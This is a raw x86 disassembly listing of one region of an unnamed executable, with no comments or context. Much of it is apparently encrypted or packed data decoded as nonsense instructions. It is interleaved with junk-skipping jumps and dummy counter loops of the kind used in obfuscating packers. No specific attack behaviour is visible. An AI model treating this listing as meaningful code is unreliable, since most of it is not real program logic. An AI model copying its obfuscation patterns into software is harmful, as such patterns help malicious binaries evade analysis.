  40e5ec:	hlt    
  40e5ed:	push   edi
  40e5ee:	push   esi
  40e5ef:	mov    DWORD PTR [edx-0xb],0x26471d1e
  40e5f6:	int3   
  40e5f7:	nop
  40e5f8:	ja     0x40e636
  40e5fa:	je     0x40e615
  40e5fc:	hlt    
  40e5fd:	jbe    0x40e5ae
  40e5ff:	mov    ds:0xa4565948,eax
  40e604:	ret    
  40e605:	(bad)  
  40e607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e608:	ss pop esp
  40e60a:	cwde   
  40e60b:	sbb    ebx,DWORD PTR [edi+0xf]
  40e60e:	in     eax,0x29
  40e610:	call   0xde38:0x450b2954
  40e617:	scas   eax,DWORD PTR es:[edi]
  40e618:	stos   BYTE PTR es:[edi],al
  40e619:	out    dx,al
  40e61a:	ja     0x40e665
  40e61c:	or     DWORD PTR [ebp+eax*4-0x5c],0xa324577b
  40e624:	ja     0x40e65b
  40e626:	and    eax,0x65efa3cf
  40e62b:	gs stos DWORD PTR es:[edi],eax
  40e62d:	mov    WORD PTR [edi+0x7b],ss
  40e630:	jne    0x40e651
  40e632:	not    BYTE PTR [ebp+edx*2+0x5c]
  40e636:	jns    0x40e660
  40e638:	add    ebx,DWORD PTR [esi]
  40e63a:	mov    esp,ecx
  40e63c:	push   edx
  40e63d:	pusha  
  40e63e:	jo     0x40e6bd
  40e640:	nop
  40e641:	mov    DWORD PTR [esi+eiz*4+0x1a88118d],ebx
  40e648:	add    al,0x7a
  40e64a:	adc    al,cl
  40e64c:	xchg   edi,eax
  40e64d:	cmc    
  40e64e:	jbe    0x40e6ad
  40e650:	dec    BYTE PTR [edi]
  40e652:	push   ss
  40e653:	shl    cl,1
  40e655:	mov    esp,0x5bb83035
  40e65a:	rcr    DWORD PTR [ecx-0xf],1
  40e65d:	or     bl,BYTE PTR [edx-0x7aa8e834]
  40e663:	sbb    eax,0x3dea8de7
  40e668:	arpl   WORD PTR [ebx-0x277461b6],si
  40e66e:	jno    0x40e63a
  40e670:	xor    dl,bl
  40e672:	xchg   dh,ah
  40e674:	push   edi
  40e675:	in     al,dx
  40e676:	lea    ebx,[ecx]
  40e678:	mov    ebp,0x85c5b9fc
  40e67d:	mov    ds:0x6f447a66,eax
  40e682:	test   DWORD PTR [eax],edi
  40e684:	out    dx,al
  40e685:	lods   eax,DWORD PTR ds:[esi]
  40e686:	and    al,0x2f
  40e688:	jg     0x40e66e
  40e68a:	inc    ecx
  40e68b:	sbb    cl,BYTE PTR [edx-0x34]
  40e68e:	push   eax
  40e68f:	lea    ebx,ds:0x86ed7c72
  40e695:	push   ebx
  40e696:	adc    BYTE PTR ds:0xe53c3e80,bh
  40e69c:	adc    al,0x14
  40e69e:	in     eax,dx
  40e69f:	or     ch,BYTE PTR [ecx+ecx*2+0x4c9d184e]
  40e6a6:	imul   ebx,DWORD PTR [ecx],0xffffff91
  40e6a9:	scas   eax,DWORD PTR es:[edi]
  40e6aa:	fwait
  40e6ab:	sbb    BYTE PTR [esi+0x1084fc49],0xc6
  40e6b2:	nop
  40e6b3:	scas   eax,DWORD PTR es:[edi]
  40e6b4:	and    eax,0x2615dec
  40e6b9:	adc    eax,0x48002a4c
  40e6be:	aaa    
  40e6bf:	add    BYTE PTR [edi+0x47dd780f],0xc8
  40e6c6:	xor    eax,edi
  40e6c8:	add    dl,dl
  40e6ca:	je     0x40e744
  40e6cc:	xchg   ebx,eax
  40e6cd:	stos   BYTE PTR es:[edi],al
  40e6ce:	ret    0x9817
  40e6d1:	dec    esp
  40e6d2:	das    
  40e6d3:	and    eax,0x5224e689
  40e6d8:	gs nop
  40e6da:	repz and esi,esi
  40e6dd:	cmp    al,0xc3
  40e6df:	jne    0x40e6e4
  40e6e1:	and    eax,0x30fe421d
  40e6e6:	repz clc 
  40e6e8:	xchg   edi,eax
  40e6e9:	retf   0x50fe
  40e6ec:	inc    ebx
  40e6ed:	add    esi,DWORD PTR [ebx+0x8682daf]
  40e6f3:	xchg   ebp,eax
  40e6f4:	lods   eax,DWORD PTR ds:[esi]
  40e6f5:	jl     0x40e72b
  40e6f7:	sbb    dh,dl
  40e6f9:	mov    edi,0xce8404f5
  40e6fe:	xor    eax,esi
  40e700:	add    eax,ebx
  40e702:	mov    DWORD PTR [ebp+0x8],eax
  40e705:	mov    eax,ds:0x41eae6
  40e70a:	mov    DWORD PTR [ebp+0x8],eax
  40e70d:	mov    eax,DWORD PTR [ebp-0x14]
  40e710:	mov    DWORD PTR [ebp-0x4],eax
  40e713:	mov    eax,DWORD PTR [ebp-0x4]
  40e716:	push   0x4
  40e718:	pop    ecx
  40e719:	sub    ecx,eax
  40e71b:	add    ecx,DWORD PTR [ebp-0x18]
  40e71e:	mov    DWORD PTR [ebp-0x8],ecx
  40e721:	jmp    0x40e979
  40e726:	(bad)
  40e729:	(bad)  
  40e72a:	leave  
  40e72b:	fcmovbe st,st(5)
  40e72d:	sar    esp,1
  40e72f:	rcr    DWORD PTR [esp+edi*1],1
  40e732:	test   eax,0x3f6996cf
  40e737:	mov    ebx,0x7e357878
  40e73c:	js     0x40e7b6
  40e73e:	sbb    esp,esp
  40e740:	test   DWORD PTR [ebp+0x3c],edi
  40e743:	adc    edi,DWORD PTR ds:[esp+ebx*1-0x2b]
  40e748:	mov    dl,0xc
  40e74a:	(bad)  
  40e74b:	sbb    eax,0xe0f59817
  40e750:	adc    ebp,DWORD PTR ds:0x742d2021
  40e756:	sub    BYTE PTR [ebx+ebx*2],dl
  40e759:	pop    ebx
  40e75a:	clc    
  40e75b:	scas   eax,DWORD PTR es:[edi]
  40e75c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e75d:	or     DWORD PTR [esi],ebp
  40e75f:	mov    edx,0x124d4c4
  40e764:	enter  0x5b5,0x89
  40e768:	jb     0x40e7d8
  40e76a:	cmp    ebx,eax
  40e76c:	retf   
  40e76d:	(bad)  
  40e76e:	sbb    DWORD PTR [edx],esi
  40e770:	or     eax,0x81acbaf
  40e775:	jae    0x40e726
  40e777:	cmp    dl,BYTE PTR [edx]
  40e779:	(bad)  
  40e77a:	pop    ecx
  40e77b:	pop    esi
  40e77c:	(bad)  [ebx+0x7d]
  40e77f:	sbb    eax,0x78ff8eac
  40e784:	loop   0x40e7a4
  40e786:	cwde   
  40e787:	mov    ch,0x2f
  40e789:	ss leave 
  40e78b:	xor    al,0x6a
  40e78d:	mov    dl,0xa9
  40e78f:	pop    ebp
  40e790:	mov    ecx,0x976d3080
  40e795:	xchg   ebx,eax
  40e796:	mov    al,dl
  40e798:	repz push esi
  40e79a:	jle    0x40e721
  40e79c:	mov    edx,0xa92895e0
  40e7a1:	push   ss
  40e7a2:	push   0x31
  40e7a4:	push   0xff5389f4
  40e7a9:	push   es
  40e7aa:	cmp    al,0xb1
  40e7ac:	jno    0x40e7e4
  40e7ae:	call   0x72de:0x780ade6d
  40e7b5:	cwde   
  40e7b6:	loop   0x40e751
  40e7b8:	jae    0x40e787
  40e7ba:	xchg   ebp,eax
  40e7bb:	and    al,BYTE PTR [ebx+0x5e]
  40e7be:	lods   al,BYTE PTR ds:[esi]
  40e7bf:	xor    eax,0xc7bc3e91
  40e7c4:	jle    0x40e77b
  40e7c6:	loop   0x40e748
  40e7c8:	sub    bl,bl
  40e7ca:	sub    dl,BYTE PTR [eax-0x54]
  40e7cd:	or     eax,0x430b3cfe
  40e7d2:	lahf   
  40e7d3:	inc    edi
  40e7d4:	je     0x40e806
  40e7d6:	push   ebp
  40e7d7:	iret   
  40e7d8:	push   esi
  40e7d9:	sbb    dl,BYTE PTR [edx+0x655176e6]
  40e7df:	and    dl,ch
  40e7e1:	(bad)  
  40e7e2:	call   0x954eb911
  40e7e7:	loopne 0x40e841
  40e7e9:	pop    ebp
  40e7ea:	lds    eax,FWORD PTR [eax+eax*1]
  40e7ed:	mov    ecx,0xf39ced73
  40e7f2:	pop    edx
  40e7f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7f4:	adc    eax,0xcbf0bcc2
  40e7f9:	std    
  40e7fa:	jne    0x40e818
  40e7fc:	mov    cl,0x43
  40e7fe:	cmp    DWORD PTR [ebp+0x2],0xffffffcc
  40e802:	xchg   BYTE PTR [ebp+esi*8-0x1b],bl
  40e806:	mov    eax,0x93969448
  40e80b:	cdq    
  40e80c:	jmp    0x40e802
  40e80e:	mov    al,ds:0x72f1d54a
  40e813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e814:	add    eax,0xefedf2f5
  40e819:	jb     0x40e7d3
  40e81b:	sbb    BYTE PTR [ebx+0x59],0xc6
  40e81f:	in     al,dx
  40e820:	aad    0xea
  40e822:	aam    0x48
  40e824:	adc    eax,0x8dcad3c3
  40e829:	jmp    0x142f7779
  40e82e:	cmp    eax,0xefad2177
  40e833:	push   edx
  40e834:	pop    ebx
  40e835:	xchg   ebx,eax
  40e836:	xor    al,0x64
  40e838:	jae    0x40e7d2
  40e83a:	pop    esi
  40e83b:	adc    ebp,DWORD PTR [ebx+0x43]
  40e83e:	and    esi,eax
  40e840:	mov    bl,BYTE PTR [ecx-0x7e]
  40e843:	loop   0x40e7df
  40e845:	xchg   DWORD PTR [eax-0x630545a],ecx
  40e84b:	pusha  
  40e84c:	push   ds
  40e84d:	and    eax,0x3b7f910c
  40e852:	jno    0x40e8c8
  40e854:	frstor [edi]
  40e856:	je     0x40e7eb
  40e858:	jae    0x40e83b
  40e85a:	jl     0x40e81b
  40e85c:	xor    dl,BYTE PTR [ecx+eax*1-0xb]
  40e860:	mov    cl,0x35
  40e862:	add    eax,0xb80958ea
  40e867:	push   ds
  40e868:	jb     0x40e8ca
  40e86a:	cmp    eax,0xee4e080c
  40e86f:	js     0x40e88a
  40e871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e872:	adc    eax,ebp
  40e874:	das    
  40e875:	and    BYTE PTR [ebp+0x2fbf8045],ah
  40e87b:	or     dh,BYTE PTR [esi-0xf]
  40e87e:	dec    edi
  40e87f:	jge    0x40e8f3
  40e881:	gs mov edi,0x3091f491
  40e887:	clc    
  40e888:	les    ecx,FWORD PTR [edx-0x6]
  40e88b:	sub    dh,BYTE PTR [esi+eiz*2]
  40e88e:	mov    al,0xd5
  40e890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e891:	retf   
  40e892:	sub    DWORD PTR [edi+0x1e],ebp
  40e895:	xchg   ebx,eax
  40e896:	scas   al,BYTE PTR es:[edi]
  40e897:	cmp    eax,0xd7459cb8
  40e89c:	xchg   esi,eax
  40e89d:	or     BYTE PTR [eax+0x72c0eed9],bh
  40e8a3:	test   eax,0xf42f52da
  40e8a8:	sub    eax,0x3cde0851
  40e8ad:	and    al,0x29
  40e8af:	sub    eax,DWORD PTR [ebx+0x72fac4df]
  40e8b5:	jle    0x40e8ea
  40e8b7:	adc    ebp,DWORD PTR [eax+0x7c]
  40e8ba:	mov    fs,WORD PTR [ecx+0x54]
  40e8bd:	rcr    BYTE PTR [edx+0x1c],1
  40e8c0:	or     edi,ebp
  40e8c2:	pusha  
  40e8c3:	fst    QWORD PTR [eax-0xb]
  40e8c6:	js     0x40e944
  40e8c8:	rol    dl,1
  40e8ca:	add    DWORD PTR [edx+0x45],esi
  40e8cd:	xchg   ecx,eax
  40e8ce:	out    0x99,al
  40e8d0:	fbstp  TBYTE PTR [esi+0x49]
  40e8d3:	int    0x25
  40e8d5:	cmp    ecx,eax
  40e8d7:	push   edx
  40e8d8:	jns    0x40e8f3
  40e8da:	leave  
  40e8db:	bound  esi,QWORD PTR [esi+0x38]
  40e8de:	and    BYTE PTR [edx],ch
  40e8e0:	xor    DWORD PTR [ebx-0x74d06647],esi
  40e8e6:	loope  0x40e884
  40e8e8:	mov    al,ds:0x7fe0760
  40e8ed:	icebp  
  40e8ee:	cmp    DWORD PTR [edi],ebp
  40e8f0:	pop    ds
  40e8f1:	rcl    BYTE PTR [eax+0x41150ba3],1
  40e8f7:	sub    BYTE PTR [eax+eax*2-0x481bf382],0x51
  40e8ff:	mov    esp,0xf02fef8
  40e904:	cdq    
  40e905:	xchg   DWORD PTR [ebx],edx
  40e907:	outs   dx,DWORD PTR ds:[esi]
  40e908:	pop    ebp
  40e909:	jg     0x40e8f5
  40e90b:	lods   al,BYTE PTR ds:[esi]
  40e90c:	mov    esp,0x93f252fe
  40e911:	dec    esp
  40e912:	inc    esp
  40e913:	jae    0x40e896
  40e915:	add    al,0xe0
  40e917:	cdq    
  40e918:	xchg   BYTE PTR [ebx],bl
  40e91a:	fld    DWORD PTR [edx*8+0x2fb6df6f]
  40e921:	test   eax,0x23291476
  40e926:	adc    DWORD PTR [edx],eax
  40e928:	in     al,dx
  40e929:	fdiv   st(1),st
  40e92b:	sbb    al,0x4f
  40e92d:	(bad)  
  40e92e:	sbb    al,0x9a
  40e930:	iret   
  40e931:	mov    ds:0x9973c98d,eax
  40e936:	mov    dl,BYTE PTR [ecx]
  40e938:	jge    0x40e96d
  40e93a:	jge    0x40e8dc
  40e93c:	outs   dx,BYTE PTR ds:[esi]
  40e93d:	aaa    
  40e93e:	adc    DWORD PTR [esp+ebx*2-0x4e],ecx
  40e942:	mov    esp,0xef77a28f
  40e947:	fadd   st,st(0)
  40e949:	push   es
  40e94a:	fs (bad) 
  40e94d:	popa   
  40e94e:	loope  0x40e8f6
  40e950:	mov    cl,0x6d
  40e952:	pop    esi
  40e953:	fwait
  40e954:	mov    ecx,0xf72a4c59
  40e959:	icebp  
  40e95a:	xchg   DWORD PTR [edi+0xcb74b5f],ebx
  40e960:	lods   eax,DWORD PTR ds:[esi]
  40e961:	xchg   esi,eax
  40e962:	adc    eax,0x708141e5
  40e967:	fwait
  40e968:	retf   0x207f
  40e96b:	push   edx
  40e96c:	pop    ss
  40e96d:	ss out 0xf8,al
  40e970:	or     cl,bl
  40e972:	push   esi
  40e973:	add    ch,BYTE PTR [ecx-0x2562c55]
  40e979:	mov    eax,DWORD PTR [ebp+0xc]
  40e97c:	xor    eax,esi
  40e97e:	lea    edi,[edi+eax*1+0x327298]
  40e985:	cmp    edi,0x50a
  40e98b:	jne    0x40d51f
  40e991:	mov    eax,DWORD PTR [ebp+0xc]
  40e994:	pop    edi
  40e995:	xor    eax,esi
  40e997:	pop    esi
  40e998:	add    eax,ebx
  40e99a:	pop    ebx
  40e99b:	leave  
  40e99c:	ret    0x8
  40e99f:	push   ebp
  40e9a0:	mov    ebp,esp
  40e9a2:	sub    esp,0x44
  40e9a5:	push   edi
  40e9a6:	mov    eax,DWORD PTR [ebp+0xc]
  40e9a9:	mov    DWORD PTR [ebp-0x10],eax
  40e9ac:	mov    eax,DWORD PTR [ebp+0x8]
  40e9af:	and    DWORD PTR ds:0x42a7f1,0x0
  40e9b9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9bf:	inc    edx
  40e9c0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9c6:	cmp    DWORD PTR ds:0x42a7f1,0x6
  40e9cd:	jne    0x40e9dc
  40e9d3:	push   DWORD PTR [ebp-0x28]
  40e9d6:	call   DWORD PTR ds:0x41d250
  40e9dc:	cmp    DWORD PTR ds:0x42a7f1,0x5
  40e9e3:	jne    0x40e9f6
  40e9e9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9ef:	inc    edx
  40e9f0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9f6:	cmp    DWORD PTR ds:0x42a7f1,0x10
  40e9fd:	jb     0x40e9b9
  40ea03:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  40ea0a:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40ea11:	jmp    0x40ec99
  40ea16:	cmp    eax,0xd6ce3ed7
  40ea1b:	aad    0xcd
  40ea1d:	xlat   BYTE PTR ds:[ebx]
  40ea1e:	jecxz  0x40e9ce
  40ea20:	ja     0x40e9b6
  40ea22:	add    al,0x4a
  40ea24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea25:	sahf   
  40ea26:	hlt    
  40ea27:	mov    ecx,0x7ee57878
  40ea2c:	js     0x40eaa6
  40ea2e:	dec    esi
  40ea2f:	cmp    ecx,edx
  40ea31:	jmp    0x7279:0x2291c75c
  40ea38:	xchg   edi,eax
  40ea39:	and    eax,ebp
  40ea3b:	not    DWORD PTR [edx-0x6525082a]
  40ea41:	or     al,0x85
  40ea43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea44:	aad    0xf9
  40ea46:	jle    0x40ea77
  40ea48:	(bad)  
  40ea4a:	idiv   DWORD PTR [esp+ebp*1+0x490d13bb]
  40ea51:	mov    ecx,0x4129ecff
  40ea56:	jmp    0xa0fd:0x5d8b7602
  40ea5d:	retf   0xb753
  40ea60:	or     DWORD PTR [edi+0x38],ebp
  40ea63:	jno    0x40eabf
  40ea65:	pop    esp
  40ea66:	and    al,0x15
  40ea68:	rcr    BYTE PTR [ecx-0x66],0x7b
  40ea6c:	push   ebp
  40ea6d:	jnp    0x40eaed
  40ea6f:	pushf  
  40ea70:	lea    edi,[edi+0x22]
  40ea73:	shr    cl,1
  40ea75:	cmp    ch,al
  40ea77:	pop    ebx
  40ea78:	mul    DWORD PTR fs:[ebx]
  40ea7b:	dec    ecx
  40ea7c:	mov    al,0xe9
  40ea7e:	dec    ecx
  40ea7f:	dec    ebp
  40ea80:	pushf  
  40ea81:	and    eax,0x88a61c56
  40ea86:	retf   
  40ea87:	cmp    ebp,DWORD PTR [esp]
  40ea8a:	lds    edi,FWORD PTR gs:[esi+0x6]
  40ea8e:	out    0x2b,al
  40ea90:	(bad)  
  40ea91:	loop   0x40ea96
  40ea93:	mov    WORD PTR [ecx-0x38e7f654],ds
  40ea99:	mov    bl,0x3e
  40ea9b:	or     al,0x79
  40ea9d:	and    eax,0x6044194b
  40eaa2:	loope  0x40eb1e
  40eaa4:	inc    edx
  40eaa5:	test   ebp,edx
  40eaa7:	push   es
  40eaa8:	das    
  40eaa9:	aad    0xa4
  40eaab:	jne    0x40ea60
  40eaad:	and    DWORD PTR [ebp+0x33],ebx
  40eab0:	(bad)  
  40eab1:	xchg   ebp,eax
  40eab2:	popf   
  40eab3:	out    dx,al
  40eab4:	add    dl,al
  40eab6:	add    eax,0x4cf5bfce
  40eabb:	sub    eax,0x8ab21446
  40eac0:	int3   
  40eac1:	jne    0x40eae8
  40eac3:	inc    edi
  40eac4:	mov    dh,0x5d
  40eac6:	das    
  40eac7:	outs   dx,DWORD PTR ds:[esi]
  40eac8:	xchg   edi,eax
  40eac9:	or     al,cl
  40eacb:	stc    
  40eacc:	or     dh,BYTE PTR [esi+0x34782676]
  40ead2:	adc    eax,0xc61ad028
  40ead7:	dec    ecx
  40ead8:	or     al,0xbe
  40eada:	xlat   BYTE PTR ds:[ebx]
  40eadb:	and    dl,BYTE PTR es:[ebp-0x38]
  40eadf:	mov    cl,0xfa
  40eae1:	aas    
  40eae2:	(bad)  
  40eae3:	mov    BYTE PTR [edx-0x57],bl
  40eae6:	add    ecx,DWORD PTR [ebp-0x51]
  40eae9:	mov    edx,0xffdf7195
  40eaee:	add    al,bl
  40eaf0:	mov    ch,0x48
  40eaf2:	adc    ch,cl
  40eaf4:	jb     0x40eabf
  40eaf6:	xchg   ecx,eax
  40eaf7:	pop    esp
  40eaf8:	and    bh,0xaf
  40eafb:	sbb    ch,BYTE PTR [edi+0x47f705f8]
  40eb01:	jmp    0x8812:0x9667db1c
  40eb08:	mov    cl,0x4b
  40eb0a:	imul   esp,edi,0xfffffffe
  40eb0d:	pusha  
  40eb0e:	or     BYTE PTR [ebp-0x7a153213],0xf0
  40eb15:	imul   edi,DWORD PTR [ebx-0x4111cc33],0xa04892bb
  40eb1f:	push   esp
  40eb20:	mov    DWORD PTR [edi],ebx
  40eb22:	int3   
  40eb23:	add    ebp,DWORD PTR [eax+0x374735ae]
  40eb29:	jmp    DWORD PTR [edx]
  40eb2b:	fidivr WORD PTR [ebx]
  40eb2d:	xor    eax,0xe9f6929d
  40eb32:	inc    esp
  40eb33:	pop    edx
  40eb34:	push   0x197bc309
  40eb39:	sbb    eax,0xbb4262
  40eb3e:	ss mov ah,0x25
  40eb41:	je     0x40ead0
  40eb43:	ja     0x40eafd
  40eb45:	(bad)
  40eb49:	mov    ebp,esp
  40eb4b:	ins    BYTE PTR es:[edi],dx
  40eb4c:	rol    DWORD PTR [ecx],1
  40eb4e:	fwait
  40eb4f:	or     al,0x17
  40eb51:	cmp    al,0xad
  40eb53:	arpl   WORD PTR [edi-0x4c],ax
  40eb56:	push   ebp
  40eb57:	sti    
  40eb58:	stos   DWORD PTR es:[edi],eax
  40eb59:	sbb    edi,DWORD PTR [eax-0x49]
  40eb5c:	adc    al,0xb
  40eb5e:	mov    edx,0x5d322f95
  40eb63:	(bad)  
  40eb64:	lock out 0x40,al
  40eb67:	test   eax,0x2988a1a0
  40eb6c:	sti    
  40eb6d:	add    al,0x22
  40eb6f:	retf   0x6df4
  40eb72:	mov    edx,ss
  40eb74:	push   esi
  40eb75:	mov    ecx,0xc19c359d
  40eb7a:	sti    
  40eb7b:	retf   
  40eb7c:	xchg   edx,eax
  40eb7d:	jne    0x40ebfc
  40eb7f:	daa    
  40eb80:	bound  esi,QWORD PTR [esi+0x4260a2d8]
  40eb86:	xor    cl,BYTE PTR ds:0xbcdd7ddb
  40eb8c:	arpl   bx,dx
  40eb8e:	sbb    eax,0x6d3d1d6e
  40eb93:	dec    edx
  40eb94:	pop    esp
  40eb95:	pop    edi
  40eb96:	xbegin 0x23d614a1
  40eb9c:	xchg   DWORD PTR [ecx],ecx
  40eb9e:	mov    ds:0x8c49bd84,al
  40eba3:	mov    ds:0xc8bfc76c,eax
  40eba8:	add    eax,0xbc9419a
  40ebad:	jae    0x40ebc1
  40ebaf:	int3   
  40ebb0:	(bad)  
  40ebb2:	adc    al,0x2d
  40ebb4:	mov    BYTE PTR [ecx+eiz*2-0x6c],bl
  40ebb8:	aaa    
  40ebb9:	lock ficom WORD PTR [edi+0x39]
  40ebbd:	jmp    0x2639:0xb18d54ad
  40ebc4:	push   ebp
  40ebc5:	pop    ebp
  40ebc6:	dec    ebx
  40ebc7:	in     eax,dx
  40ebc8:	shl    BYTE PTR [ecx-0xc8b5d16],cl
  40ebce:	and    ecx,DWORD PTR [edx]
  40ebd0:	mov    edx,0xea3901dd
  40ebd5:	cli    
  40ebd6:	adc    DWORD PTR [ebx-0xb],edi
  40ebd9:	push   ebp
  40ebda:	test   eax,0x5e0c0d0c
  40ebdf:	mov    ds:0x186f67f4,al
  40ebe4:	or     al,0x2b
  40ebe6:	in     eax,dx
  40ebe7:	adc    DWORD PTR [eax+edi*8-0x4d59d734],eax
  40ebee:	mov    ch,0x92
  40ebf0:	cs pop ecx
  40ebf2:	retf   
  40ebf3:	mov    edi,0x3047294a
  40ebf8:	and    al,0x2e
  40ebfa:	sub    DWORD PTR ds:0x69a27bf2,ecx
  40ec00:	jne    0x40ec69
  40ec02:	sub    al,0xab
  40ec04:	das    
  40ec05:	xor    esp,DWORD PTR [esi-0x1f]
  40ec08:	pop    ebp
  40ec09:	js     0x40ebc0
  40ec0b:	loop   0x40ec85
  40ec0d:	or     BYTE PTR [eax-0x32bcfda4],0x9d
  40ec14:	clc    
  40ec15:	inc    esp
  40ec16:	fdivr  DWORD PTR [eax+0xc]
  40ec19:	xchg   edx,eax
  40ec1a:	test   DWORD PTR [ebx+0x69],ebp
  40ec1d:	jns    0x40ec5d
  40ec1f:	adc    bl,BYTE PTR ds:0xbae297f3
  40ec25:	add    ecx,DWORD PTR [ebx+0x37]
  40ec28:	fld    TBYTE PTR [ebx-0xf]
  40ec2b:	mov    al,ds:0xd3cd8342
  40ec30:	xor    DWORD PTR [esi],esp
  40ec32:	fst    QWORD PTR [eax-0x4228f484]
  40ec38:	ja     0x40ec9b
  40ec3a:	mov    ch,0x9e
  40ec3c:	mov    esp,0xa094139a
  40ec41:	js     0x40ec3e
  40ec43:	mov    BYTE PTR [edx+0x728b3138],cl
  40ec49:	dec    ebx
  40ec4a:	dec    esi
  40ec4b:	mov    al,ds:0x97a65701
  40ec50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec51:	stos   BYTE PTR es:[edi],al
  40ec52:	or     BYTE PTR [edi],dh
  40ec54:	aad    0xf3
  40ec56:	stc    
  40ec57:	cmp    dh,BYTE PTR [ebx+0x7668a189]
  40ec5d:	mov    BYTE PTR [esi],cl
  40ec5f:	and    DWORD PTR [ecx-0x20],edi
  40ec62:	mov    eax,0x2d8f3fa8
  40ec67:	out    0xec,al
  40ec69:	dec    ebx
  40ec6a:	mov    dl,0xb1
  40ec6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec6d:	std    
  40ec6e:	push   esi
  40ec6f:	cmp    eax,0xabf993dc
  40ec74:	test   BYTE PTR [edx-0x1ee9b0af],0x57
  40ec7b:	(bad)  
  40ec7e:	xchg   DWORD PTR [eax-0x55],ecx
  40ec81:	xor    DWORD PTR ds:0x30ecfd0c,esp
  40ec87:	xchg   edx,eax
  40ec88:	aad    0x44
  40ec8a:	adc    ecx,ebp
  40ec8c:	leave  
  40ec8d:	mov    eax,ds:0x878365e8
  40ec92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec93:	clc    
  40ec94:	retf   0x7b18
  40ec97:	imul   ebx,DWORD PTR [edi-0x75],0x55
  40ec9b:	or     BYTE PTR [ebx],cl
  40ec9d:	or     eax,0x42a77d
  40eca2:	mov    DWORD PTR [ebp-0x40],eax
  40eca5:	mov    eax,0x7510850
  40ecaa:	xor    edx,eax
  40ecac:	add    edi,0x2fd0
  40ecb2:	mov    ecx,0x327298
  40ecb7:	mov    DWORD PTR ds:0x42a879,0x17
  40ecc1:	cmp    DWORD PTR ds:0x42a879,0x0
  40ecc8:	je     0x40ed80
  40ecce:	cmp    DWORD PTR ds:0x42a879,0x5
  40ecd5:	jne    0x40ecf1
  40ecdb:	push   DWORD PTR [ebp-0x1c]
  40ecde:	push   0x65c1
  40ece3:	push   DWORD PTR [ebp-0x20]
  40ece6:	push   0x6120
  40eceb:	call   DWORD PTR ds:0x41d254
  40ecf1:	cmp    DWORD PTR ds:0x42a879,0x6
  40ecf8:	jne    0x40ed0b
  40ecfe:	mov    edi,DWORD PTR ds:0x42a879
  40ed04:	dec    edi
  40ed05:	mov    DWORD PTR ds:0x42a879,edi
  40ed0b:	mov    edi,DWORD PTR ds:0x42a879
  40ed11:	dec    edi
  40ed12:	mov    DWORD PTR ds:0x42a879,edi
  40ed18:	jmp    0x40ecc1
  40ed1d:	and    DWORD PTR ds:0x42a885,0x0
  40ed27:	mov    edi,DWORD PTR ds:0x42a885
  40ed2d:	inc    edi
  40ed2e:	mov    DWORD PTR ds:0x42a885,edi
  40ed34:	cmp    DWORD PTR ds:0x42a885,0x5
  40ed3b:	jne    0x40ed53
  40ed41:	push   DWORD PTR [ebp-0xc]
  40ed44:	push   DWORD PTR [ebp-0xc]
  40ed47:	push   DWORD PTR [ebp-0x18]
  40ed4a:	push   DWORD PTR [ebp-0x14]
  40ed4d:	call   DWORD PTR ds:0x41d1a4
  40ed53:	cmp    DWORD PTR ds:0x42a885,0x4
  40ed5a:	jne    0x40ed6d
  40ed60:	mov    edi,DWORD PTR ds:0x42a885
  40ed66:	inc    edi
  40ed67:	mov    DWORD PTR ds:0x42a885,edi
  40ed6d:	cmp    DWORD PTR ds:0x42a885,0x1f
  40ed74:	jb     0x40ed27
  40ed7a:	add    edi,DWORD PTR ds:0x42a7fd
  40ed80:	add    edx,ecx
  40ed82:	mov    edi,DWORD PTR ds:0x42a7f1
  40ed88:	xor    DWORD PTR ds:0x42a875,edi
  40ed8e:	jmp    0x40f016
  40ed93:	retf   0xc5c0
  40ed96:	ror    cl,0xc5
  40ed99:	leave  
  40ed9a:	retf   0x1a17
  40ed9d:	push   edx
  40ed9e:	xchg   edx,eax
  40ed9f:	cld    
  40eda0:	aas    
  40eda1:	call   0x79004f67
  40eda6:	js     0x40ed8d
  40eda8:	jle    0x40ee22
  40edaa:	js     0x40ed62
  40edac:	mov    bh,0xa
  40edae:	in     eax,dx
  40edaf:	rcl    DWORD PTR [eax-0x797fc159],0x78
  40edb6:	daa    
  40edb7:	mov    edi,0x4d496d14
  40edbc:	in     al,dx
  40edbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40edbe:	nop    ebp
  40edc1:	adc    ebx,ecx
  40edc3:	push   ebx
  40edc4:	into   
  40edc5:	xor    al,0xa9
  40edc7:	and    DWORD PTR [ebp-0x12062a6b],ebx
  40edcd:	les    esi,FWORD PTR [edx]
  40edcf:	jo     0x40ed9f
  40edd1:	stc    
  40edd2:	adc    ecx,edx
  40edd4:	jmp    0xcdba:0xe056b5d6
  40eddb:	jmp    DWORD PTR [ebp-0x5f]
  40edde:	push   0x1b4e0cc3
  40ede3:	daa    
  40ede4:	sbb    DWORD PTR [edx],ebx
  40ede6:	fldenv [ebx+0x31]
  40ede9:	or     al,0x2a
  40edeb:	ja     0x40edb9
  40eded:	jle    0x40ede8
  40edef:	ins    DWORD PTR es:[edi],dx
  40edf0:	rcr    DWORD PTR [ebx-0x9],1
  40edf3:	aam    0x6b
  40edf5:	jb     0x40ee00
  40edf7:	pusha  
  40edf8:	inc    ecx
  40edf9:	stos   BYTE PTR es:[edi],al
  40edfa:	sub    BYTE PTR [ecx-0x7414d50],al
  40ee00:	ja     0x40ee02
  40ee02:	and    al,0x41
  40ee04:	mov    ebx,0xeaa07bcc
  40ee09:	xor    eax,0xae97cab4
  40ee0e:	je     0x40ee1b
